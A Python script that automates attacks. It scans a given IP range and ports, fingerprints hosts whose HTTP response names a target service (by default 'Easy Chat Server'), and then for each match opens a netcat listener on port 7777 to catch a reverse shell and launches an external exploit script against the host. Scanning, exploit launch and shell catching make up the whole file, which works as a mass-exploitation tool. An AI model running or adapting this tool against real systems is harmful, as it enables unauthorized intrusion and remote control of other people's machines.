from scanerScapyO import scannerScapy as sc
from scanerScapyO import createParser, get_ip_range, get_port_range_list
import sys
import time
import subprocess


def findUtil(ip_open_ports_dict,  UtilitName, vget):
    utilit_dict = {}
    for ip in  ip_open_ports_dict:
        for port in ip_open_ports_dict[ip]:
            get_http = scaner.do_get(ip, port)
            if get_http is not None:
                get_http = str(get_http)
                if (vget):
                    print(get_http)
                if get_http.find(UtilitName) != -1:
                    print("Utilit find", UtilitName, "on ", port, ip)
                    if ip not in utilit_dict:
                        utilit_dict[ip] = list()
                    utilit_dict[ip].append(port)
    return utilit_dict
 
def exploit(ip, port, exploitpy):
    
    myshell = subprocess.Popen(["sudo", "nc", "-nvlp", "7777"])
    exploitp = subprocess.Popen(["sudo", "python3", exploitpy, ip, str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    exploitp.wait()
    myshell.wait()          

if __name__ == '__main__':
    
    parser = createParser()
    parser.add_argument('-u', '--util', nargs='?', type=str, default='Easy Chat Server')
    parser.add_argument('-e', '--expl', nargs='?', type=str, default='EasyChatExploitMy.py')
    parser.add_argument('--vget', default=False, action='store_true')
   
    args = parser.parse_args (sys.argv[1:])
    ip_range = None;
    port_list = [];
    if args.ip:
        ip_range = get_ip_range(args.ip[0], args.ip[0])
    if args.net:
        ip_range = get_ip_range(args.net[0], args.net[1])
    if args.port:
        port_list = args.port;
    if args.port_range:
        port_list = get_port_range_list(args.port_range[0], args.port_range[1])
    
    scaner = sc(ip_range, 
    port_list = port_list, 
    typesc = args.scanner,
    tm = args.timeout, 
    w = args.wait)
    
    ip_open_ports_dict = scaner.scan()
    print(ip_open_ports_dict)
    
    util_dict = findUtil(ip_open_ports_dict, args.util, args.vget)
    for ip in  util_dict:
        for port in util_dict[ip]:
            exploit(ip, port, args.expl)
    
                
    
    
    